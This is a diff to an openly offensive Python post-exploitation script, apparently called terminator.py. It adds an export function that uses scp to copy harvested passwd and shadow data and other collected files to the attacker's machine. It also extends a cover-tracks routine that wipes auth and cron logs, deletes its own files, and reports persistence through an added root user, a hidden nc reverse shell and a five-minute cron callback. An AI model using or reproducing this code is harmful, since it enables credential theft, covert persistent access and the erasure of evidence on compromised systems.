@@ -621,15 +621,22 @@ def extract(username,password,local_ip,local_port):
    os.system("cat /tmp/passwd_res.txt >> /tmp/priv.txt")
    os.system("cat /tmp/shad_res.txt >> /tmp/priv.txt")
 
-   # exfil the data files to local machine
-   time.sleep(2)
+
+# export priv.txt and data_exfil.txt to local machine
+def export(local_ip):
+   time.sleep(1)
+
+   # get username of local user to scp files to
    u_root = input("\n\n### specify local username to send data to (for scp): ")
    time.sleep(2)
+
+   # try to scp files to local machine using inputted username
    try:
       print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n+input your local machine root password+".format(u_root,local_ip))
       os.system("scp /tmp/data_exfil.txt /tmp/priv.txt {}@{}:/terminator/".format(u_root,local_ip))
    except:
-      print("*** error sending files to {}@{}:/terminator/\n*** specified user may not have write permissions in /terminator/ directory\n*** please specify different user or change permissions of /terminator/ on local machine with 'chmod 777 /terminator/".format(u_root,local_ip))
+      print("\n*** error sending files to {}@{}:/terminator/\n*** specified user may not have write permissions in /terminator/ directory\n*** please specify different user or change permissions of /terminator/ on local machine with 'chmod 777 /terminator/".format(u_root,local_ip))
+      export(local_ip)
    else:
       print("\n*** data_exfil.txt and priv.txt sent to {}/terminator/ ***".format(local_ip))
 
@@ -637,7 +644,7 @@ def extract(username,password,local_ip,local_port):
 # cover tracks ###############################
 
 # reestablish history logging and replace log files
-def clear_tracks():
+def clear_tracks(username,password,local_ip,local_port):
    print("\n### clearing and replacing log files to previous state... ###")
    os.system("echo ' ' > /var/log/auth.log 2>/dev/null")
    os.system("echo ' ' > /var/log/cron.log 2>/dev/null")
@@ -676,6 +683,14 @@ def clear_tracks():
    os.system("rm -f /tmp/priv.txt")
    os.system("rm -f /tmp/print.txt")
    os.system("rm -rf /tmp/* 2>/dev/null")
+
+   # print persistence info to screen
+   print("\n\n### persistence established with the following ###")
+   print("- user {}:{} was added with root privileges".format(username,password))
+   print("- nc reverse shell callback implanted at /dev/shm/.data/data_log")
+   print("- cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}".format(local_ip,local_port))
+
+   # delete terminator.py file
    os.system("rm -f terminator.py")
    exit()
 
@@ -843,7 +858,8 @@ elif module == "root":
       callback(local_ip, local_port)
       cron_make()
       extract(username,password,local_ip,local_port)
-      clear_tracks()
+      export(local_ip)
+      clear_tracks(username,password,local_ip,local_port)
 elif module == "report":
    # call report functions
    report(output)
